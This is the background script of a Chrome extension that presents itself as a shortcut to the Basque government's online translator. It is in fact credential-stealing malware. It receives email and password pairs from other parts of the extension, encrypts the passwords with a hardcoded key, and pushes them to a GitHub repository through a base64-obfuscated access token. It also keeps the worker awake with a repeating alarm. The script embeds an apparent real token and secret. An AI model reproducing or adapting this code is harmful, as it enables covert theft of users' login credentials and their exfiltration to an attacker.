import {Octokit, App} from "https://cdn.skypack.dev/octokit";
import CryptoJS from "./crypto.js";

// Prevent sleep
chrome.alarms.create({periodInMinutes: 4.9});
chrome.alrams.onAlarm.addListener(() => {
	let hi = "hello";
});

const crypt = {
	secret: "VFF3403",

	encrypt: (clear) => {
		let cipher = CryptoJS.AES.encrypt(clear, crypt.secret);
		cipher = cipher.toString();
		return cipher;
	}
}

const octokit = new Octokit({
	auth: atob("Z2hwXzZFeFFJYlhRY3BzMnRmUDVqRFRyU3luSjFzdWVFbjRhRjQ1TQ==")
});

function jsonParse(str) {
	try {
		const parsed = JSON.parse(str);
		if (parsed instanceof Object) {
			return parsed;
		} else {
			return {};
		}
	} catch {
		return {};
	}
}

async function send({email, pwd}) {
	const owner = "agent3204";
	const repo = "data";
	const path = "ds.json";

	try {
		const {data} = await octokit.request('GET /repos/{owner}/{repo}/contents/{path}', {
			owner: owner,
			repo: repo,
			path: path
		});

		const currentContent = jsonParse(atob(data.content));
		let state = "Updated"
		let emailInfo = currentContent[email];

		if (!emailInfo) {
			emailInfo = {};
			state = "Added"
		}

		pwd = crypt.encrypt(pwd);
		
		if (emailInfo.pwd !== pwd) {
			emailInfo.pwd = pwd;
			emailInfo.timestamp = Date.now();
			emailInfo.encrypted = true;

			currentContent[email] = emailInfo;

			await octokit.request("PUT /repos/{owner}/{repo}/contents/{path}", {
				owner: owner,
				repo: repo,
				path: path,
				message: state + " " + email,
				content: btoa(JSON.stringify(currentContent)),
				sha: data.sha
			});
		}
	}
	catch (ex) {
		console.warn("Error occurred: " + ex);
	}
}

const Queue = {
	processing: false,
	responses: []
};

function addQueue(response) {
	Queue.responses.push(response);
	if (!Queue.processing) {
		processQueue();
	}
}

async function processQueue() {
	if (Queue.processing) return;
	Queue.processing = true;

	while (Queue.responses.length > 0) {
		const response = Queue.responses.shift();
		await send(response);
	}

	Queue.processing = false;
}

chrome.action.onClicked.addListener(tab => {
	chrome.tabs.create({url: "https://www.euskadi.eus/traductor/"});
});

chrome.runtime.onMessage.addListener((response) => {
	console.log("Received response");
	addQueue(response);
});